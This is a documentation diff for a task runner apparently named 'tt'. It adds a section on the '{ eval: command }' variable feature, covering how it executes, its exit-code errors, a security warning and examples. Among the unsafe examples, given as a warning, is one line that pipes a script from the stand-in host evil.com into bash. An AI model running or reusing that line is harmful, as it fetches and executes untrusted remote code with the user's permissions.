@@ -500,6 +500,107 @@ tasks:
     cmd: make all
 ```
 
+### Evaluating Commands in Variables
+
+Variables can be populated by executing shell commands using `{ eval: command }`:
+
+```yaml
+variables:
+  git_hash: { eval: "git rev-parse --short HEAD" }
+  timestamp: { eval: "date +%Y%m%d-%H%M%S" }
+  image_tag: "myapp:{{ var.git_hash }}"
+
+tasks:
+  build:
+    cmd: docker build -t {{ var.image_tag }} .
+```
+
+**Execution:**
+
+- Commands are executed when `tt` starts (parse time), before any task execution
+- Working directory is the recipe file location
+- Uses `default_env` shell if specified in the recipe, otherwise platform default (bash on Unix, cmd on Windows)
+- Stdout is captured as the variable value
+- Stderr is ignored (or printed to terminal, not captured)
+- Trailing newline is automatically stripped (like `{ read: ... }`)
+
+**Exit codes:**
+
+Commands must succeed (exit code 0) or `tt` will fail with an error:
+
+```
+Command failed for variable 'git_hash': git rev-parse --short HEAD
+Exit code: 128
+stderr: fatal: not a git repository (or any of the parent directories): .git
+
+Ensure the command succeeds when run from the recipe file location.
+```
+
+**⚠️ Security Warning**
+
+The `{ eval: command }` feature executes shell commands with your current permissions when `tt` starts.
+
+**DO NOT** use recipes from untrusted sources that contain `{ eval: ... }`.
+
+Commands execute with:
+- Your current user permissions
+- Access to your environment variables
+- The recipe file directory as working directory
+
+**Best practices:**
+- Only use `eval` in recipes you've written or thoroughly reviewed
+- Avoid complex commands with side effects
+- Prefer `{ read: file }` or `{ env: VAR }` when possible
+- Use for read-only operations (git info, vault reads, system info)
+
+**Example safe uses:**
+
+```yaml
+variables:
+  # Version control information
+  version: { eval: "git describe --tags" }
+  commit: { eval: "git rev-parse HEAD" }
+  branch: { eval: "git rev-parse --abbrev-ref HEAD" }
+
+  # System information
+  hostname: { eval: "hostname" }
+  username: { eval: "whoami" }
+
+  # Secrets management (read-only)
+  vault_token: { eval: "vault read -field=token secret/api" }
+```
+
+**Example unsafe uses:**
+
+```yaml
+variables:
+  # DON'T DO THIS - modifies state at parse time
+  counter: { eval: "expr $(cat counter) + 1 > counter && cat counter" }
+
+  # DON'T DO THIS - downloads and executes code
+  script: { eval: "curl https://evil.com/script.sh | bash" }
+```
+
+**Use cases:**
+
+1. **Version control info** - Embed git commit hashes, tags, or branch names in builds
+2. **Secrets management** - Read API tokens from secret vaults (Vault, AWS Secrets Manager, etc.)
+3. **System information** - Capture hostname, username, or timestamp for deployments
+4. **Dynamic configuration** - Read values from external tools or configuration systems
+
+**Type handling:**
+
+Eval output is always a string, even if the command outputs a number:
+
+```yaml
+variables:
+  port: { eval: "echo 8080" }  # port = "8080" (string, not int)
+```
+
+**Performance note:**
+
+Every `{ eval: ... }` runs a subprocess at parse time, adding startup latency. For frequently-run tasks, consider caching results in files or using `{ read: ... }` to read pre-computed values.
+
 ## File Imports
 
 Split task definitions across multiple files for better organisation:
